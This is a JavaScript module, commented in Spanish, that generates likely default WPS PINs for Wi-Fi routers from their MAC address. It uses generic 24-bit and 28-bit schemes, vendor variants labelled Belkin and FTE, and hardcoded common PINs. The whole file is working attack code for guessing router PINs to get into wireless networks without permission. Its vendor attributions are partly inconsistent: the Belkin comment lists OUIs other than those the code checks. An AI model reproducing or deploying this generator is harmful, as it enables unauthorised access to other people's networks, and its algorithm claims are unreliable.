// Generador Algorítmico de PINs WPS por Defecto (MAC-to-PIN)
// Contiene implementaciones de ingeniería inversa de varios algoritmos de fabricantes.

function hex2dec(hex) {
    return parseInt(hex, 16);
}

function checksumWps(pinStr) {
    let accum = 0;
    while (pinStr.length < 7) pinStr = '0' + pinStr;
    pinStr = pinStr.substring(0, 7);
    
    accum += 3 * parseInt(pinStr[0]);
    accum += 1 * parseInt(pinStr[1]);
    accum += 3 * parseInt(pinStr[2]);
    accum += 1 * parseInt(pinStr[3]);
    accum += 3 * parseInt(pinStr[4]);
    accum += 1 * parseInt(pinStr[5]);
    accum += 3 * parseInt(pinStr[6]);
    
    let digit = (10 - (accum % 10)) % 10;
    return pinStr + digit.toString();
}

function generate24BitPin(macRaw) {
    // Extraer los últimos 3 bytes (24 bits) de la MAC (NIC part)
    const nic = macRaw.substring(6);
    const nicInt = parseInt(nic, 16);
    // Mascararlo a 7 decimales (max 9999999)
    const pin = (nicInt % 10000000).toString();
    return checksumWps(pin);
}

function generate28BitPin(macRaw) {
    // Usado típicamente en routers D-Link
    const subMac = macRaw.substring(5); // Ignora el primer y medio byte
    const nicInt = parseInt(subMac, 16);
    const pin = (nicInt % 10000000).toString();
    return checksumWps(pin);
}

function generateBelkinPin(macRaw) {
    // Algoritmo de Belkin: F0:5C:20, EC:1A:59, etc.
    let macInt = parseInt(macRaw.substring(6), 16);
    
    // Algoritmo Belkin (Ingeniería Inversa)
    const OUI = macRaw.substring(0,6).toUpperCase();
    if (["944452", "08863B", "EC1A59"].includes(OUI)) {
        macInt += 1; // Suman 1 al NIC en estos OUI específicos
    }
    
    let pinBase = macInt % 10000000;
    // XOR específico de Belkin
    pinBase ^= 0x55AA55;
    pinBase ^= (((pinBase & 0x0F) << 4) | ((pinBase & 0x0F) << 8) | ((pinBase & 0x0F) << 12) | ((pinBase & 0x0F) << 16) | ((pinBase & 0x0F) << 20));
    
    const pin = (pinBase % 10000000).toString();
    return checksumWps(pin);
}

function generateFtePin(macRaw) {
    // FTE (OUI: 00:1A:2B, 00:1F:C6, etc.)
    const nicInt = parseInt(macRaw.substring(6), 16);
    const pinBase = nicInt ^ 0x000001; // Invertir el LSB
    const pin = (pinBase % 10000000).toString();
    return checksumWps(pin);
}

function generateTopPins(bssid) {
    if (!bssid) return [];
    
    const macRaw = bssid.replace(/:/g, '').toUpperCase();
    if (macRaw.length !== 12) return [];

    let pins = new Set();
    
    // 1. Añadir siempre los algoritmos genéricos (muy comunes)
    pins.add({ pin: generate24BitPin(macRaw), algo: 'Genérico (MAC 24-bit)' });
    pins.add({ pin: generate28BitPin(macRaw), algo: 'Genérico (MAC 28-bit)' });
    
    // 2. Belkin
    const belkinPin = generateBelkinPin(macRaw);
    if(belkinPin !== generate24BitPin(macRaw)) {
        pins.add({ pin: belkinPin, algo: 'Belkin XOR' });
    }
    
    // 3. FTE
    pins.add({ pin: generateFtePin(macRaw), algo: 'FTE' });

    // 4. Fallback genérico a PINs estadísticamente más comunes en el mundo si es necesario rellenar
    pins.add({ pin: '12345670', algo: 'Estadístico (Top 1 Global)' });
    pins.add({ pin: '00000000', algo: 'Hardcoded D-Link/ZyXEL' });

    // Devolvemos el Set convertido a array (los sets filtran duplicados exactos de objetos en JS solo si la referencia es igual, 
    // pero como creamos objetos nuevos, limpiaremos duplicados por el valor del PIN en un paso final).
    const uniquePinsMap = new Map();
    for (let p of pins) {
        if (!uniquePinsMap.has(p.pin)) {
            uniquePinsMap.set(p.pin, p);
        }
    }
    
    return Array.from(uniquePinsMap.values()).slice(0, 5); // Devolver Top 5
}

module.exports = { generateTopPins };
